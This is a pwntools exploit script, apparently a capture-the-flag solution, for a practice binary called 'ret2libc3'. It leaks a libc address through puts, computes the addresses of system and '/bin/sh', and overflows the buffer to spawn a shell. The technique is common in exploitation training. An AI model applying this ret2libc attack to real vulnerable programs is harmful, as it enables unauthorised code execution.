from pwn import*
context(os='linux', arch='i386', log_level='debug')
sh=process(["qemu-i386","-L","/usr/i686-linux-gnu/","./ret2libc3"])
ret2libc3=ELF('./ret2libc3')
libc=ELF('/usr/i686-linux-gnu/lib/libc.so.6')
puts_plt = ret2libc3.plt['puts']	# plt表中的地址
libc_start_main = ret2libc3.got['__libc_start_main']	# got表中指向__libc_start_main的指针
start = ret2libc3.symbols['_start']		# 获取_start函数的地址
puts_got= ret2libc3.got['puts']		

sh.sendlineafter('Can you find it !?',flat(['a'*112, puts_plt, start, libc_start_main]))
libc_start_main_addr= u32(sh.recv()[0:4])
libc_base=libc_start_main_addr-libc.symbols['__libc_start_main']

system_addr=libc_base+libc.symbols['system']

bin_sh_addr=libc_base+next(libc.search(b'/bin/sh'))

payload = flat(['A' * 112, system_addr, 0xdeadbeef, bin_sh_addr])
sh.sendline(payload)
sh.interactive()